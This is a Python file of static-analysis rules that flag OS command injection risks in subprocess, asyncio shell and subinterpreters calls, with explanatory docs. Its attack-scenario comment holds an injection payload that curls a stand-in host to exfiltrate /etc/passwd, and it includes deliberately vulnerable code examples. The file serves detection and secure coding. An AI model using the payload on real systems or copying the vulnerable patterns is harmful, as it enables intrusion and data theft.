"""
Subprocess and Process Execution Security Rules for Python

Rules in this file:
- PYTHON-LANG-SEC-020: Dangerous subprocess Usage (CWE-78)
- PYTHON-LANG-SEC-021: subprocess with shell=True (CWE-78)
- PYTHON-LANG-SEC-022: Dangerous asyncio Shell Execution (CWE-78)
- PYTHON-LANG-SEC-023: Dangerous subinterpreters run_string (CWE-95)

Security Impact: HIGH
CWE: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
OWASP: A03:2021 - Injection

DESCRIPTION:
The subprocess module is Python's recommended interface for spawning child
processes. However, when subprocess calls use shell=True or accept unsanitized
user input as command arguments, they become vulnerable to OS command injection.
The asyncio module provides asynchronous equivalents (create_subprocess_shell)
that carry the same risks. Python's experimental subinterpreters API allows
executing arbitrary code strings in isolated interpreters.

SECURITY IMPLICATIONS:
Using subprocess with shell=True causes the command to be interpreted by the
system shell (/bin/sh on Unix), enabling shell metacharacter injection through
pipes, semicolons, backticks, and command substitution. Even without shell=True,
passing unsanitized user input as command arguments can lead to argument injection.
The asyncio.create_subprocess_shell() function is equivalent to shell=True and
carries identical risks. The subinterpreters run_string() API executes arbitrary
Python code strings, enabling code injection if the string is user-controlled.

    # Attack scenario: shell injection via subprocess
    filename = request.args.get("file")
    subprocess.call(f"cat {filename}", shell=True)
    # Attacker sends: "file.txt; curl attacker.com/exfil?d=$(cat /etc/passwd)"

VULNERABLE EXAMPLE:
```python
import subprocess
user_cmd = request.form["command"]
subprocess.call(user_cmd, shell=True)             # Full shell injection
subprocess.Popen(f"grep {user_input} log", shell=True)  # Shell injection
await asyncio.create_subprocess_shell(user_cmd)    # Async shell injection
```

SECURE EXAMPLE:
```python
import subprocess
# Pass arguments as a list (no shell interpretation)
subprocess.run(["grep", user_input, "log"], check=True)
# Use asyncio exec variant (no shell)
await asyncio.create_subprocess_exec("grep", user_input, "log")
# Validate and restrict allowed commands
ALLOWED_COMMANDS = {"ls", "grep", "wc"}
if cmd not in ALLOWED_COMMANDS:
    raise ValueError("Command not allowed")
```

DETECTION AND PREVENTION:
- Always use subprocess with list arguments instead of shell=True
- Prefer asyncio.create_subprocess_exec() over create_subprocess_shell()
- Validate all user input against strict allowlists before passing to commands
- Use shlex.split() to safely tokenize command strings when needed
- Apply the principle of least privilege to subprocess execution contexts

COMPLIANCE:
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
- OWASP A03:2021 - Injection
- SANS Top 25 (2023) - CWE-78: OS Command Injection
- NIST SP 800-53: SI-10 (Information Input Validation)

REFERENCES:
- https://cwe.mitre.org/data/definitions/78.html
- https://owasp.org/Top10/A03_2021-Injection/
- https://docs.python.org/3/library/subprocess.html#security-considerations
- https://docs.python.org/3/library/asyncio-subprocess.html
- https://docs.python.org/3/library/shlex.html#shlex.split
"""

from rules.python_decorators import python_rule
from codepathfinder import calls, flows, QueryType
from codepathfinder.presets import PropagationPresets


class SubprocessModule(QueryType):
    fqns = ["subprocess"]


class AsyncioModule(QueryType):
    fqns = ["asyncio"]


@python_rule(
    id="PYTHON-LANG-SEC-020",
    name="Dangerous subprocess Usage",
    severity="HIGH",
    category="lang",
    cwe="CWE-78",
    tags="python,subprocess,command-injection,owasp-a03,cwe-78",
    message="subprocess call detected. Ensure arguments are not user-controlled.",
    owasp="A03:2021",
)
def detect_subprocess():
    """Detects subprocess module calls."""
    return SubprocessModule.method("call", "check_call", "check_output",
                                   "run", "Popen", "getoutput", "getstatusoutput")


@python_rule(
    id="PYTHON-LANG-SEC-021",
    name="subprocess with shell=True",
    severity="HIGH",
    category="lang",
    cwe="CWE-78",
    tags="python,subprocess,shell-true,command-injection,owasp-a03,cwe-78",
    message="subprocess called with shell=True. This is vulnerable to shell injection.",
    owasp="A03:2021",
)
def detect_subprocess_shell_true():
    """Detects subprocess calls with shell=True."""
    return SubprocessModule.method("call", "check_call", "check_output",
                                   "run", "Popen").where("shell", True)


@python_rule(
    id="PYTHON-LANG-SEC-022",
    name="Dangerous asyncio Shell Execution",
    severity="HIGH",
    category="lang",
    cwe="CWE-78",
    tags="python,asyncio,shell,command-injection,cwe-78",
    message="asyncio.create_subprocess_shell() detected. Use create_subprocess_exec() instead.",
    owasp="A03:2021",
)
def detect_asyncio_shell():
    """Detects asyncio.create_subprocess_shell and related methods."""
    return AsyncioModule.method("create_subprocess_shell")


@python_rule(
    id="PYTHON-LANG-SEC-023",
    name="Dangerous subinterpreters run_string",
    severity="HIGH",
    category="lang",
    cwe="CWE-95",
    tags="python,subinterpreters,code-execution,cwe-95",
    message="subinterpreters.run_string() detected. Avoid executing untrusted code strings.",
    owasp="A03:2021",
)
def detect_subinterpreters():
    """Detects _xxsubinterpreters.run_string usage."""
    return calls("_xxsubinterpreters.run_string", "subinterpreters.run_string")
